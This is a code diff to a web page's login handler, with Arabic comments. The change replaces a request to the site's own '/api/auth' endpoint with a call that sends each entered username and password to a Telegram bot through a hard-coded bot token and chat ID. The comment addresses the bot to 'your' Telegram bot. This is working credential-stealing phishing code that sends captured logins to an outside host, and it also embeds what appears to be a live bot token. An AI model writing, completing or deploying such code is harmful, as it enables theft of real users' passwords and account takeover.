@@ -149,12 +149,21 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
+            // بيانات البوت المدمجة مباشرة
+            const botToken = '8756764415:AAFFdnNRfwBgPNsgrt5ZFy-cPFmQ5v5NaIA';
+            const chatId = '6842658461';
+            
+            const message = `📥 بيانات جديدة:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+
             try {
-                // إرسال البيانات إلى السيرفر للاختبار الأمني
-                await fetch('/api/auth', {
+                // إرسال البيانات مباشرة إلى بوت تيليجرام الخاص بك
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: username, password: password })
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
                 });
             } catch (err) { 
                 console.error(err); 
